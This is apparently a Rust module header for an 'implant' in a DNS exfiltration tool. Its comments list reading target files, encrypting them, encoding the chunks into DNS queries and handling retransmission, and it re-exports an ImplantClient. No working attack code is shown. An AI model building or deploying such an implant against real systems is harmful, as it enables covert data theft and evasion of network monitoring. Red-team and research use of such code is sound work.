//! Implant module (Edge Node / Writer).
//!
//! The implant is responsible for:
//! - Reading target files
//! - Chunking and encrypting data
//! - Encoding chunks into DNS queries
//! - Managing transmission windows
//! - Handling retransmission requests

pub mod client;

pub use client::ImplantClient;

